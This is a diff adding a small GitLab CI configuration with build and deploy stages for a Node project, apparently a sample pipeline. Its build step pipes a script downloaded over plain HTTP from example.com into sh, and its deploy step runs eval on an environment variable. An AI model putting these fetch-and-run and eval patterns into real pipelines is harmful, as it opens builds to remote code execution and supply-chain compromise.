@@ -1,0 +1,19 @@
+stages:
+  - build
+  - deploy
+
+build:
+  stage: build
+  image: node:latest
+  script:
+    - curl -s http://example.com/setup.sh | sh
+    - npm install
+    - npm run build
+
+deploy:
+  stage: deploy
+  script:
+    - echo "Deploying $CI_COMMIT_REF_NAME"
+    - eval "$DEPLOY_SCRIPT"
+  rules:
+    - if: '$CI_COMMIT_BRANCH == "main"'
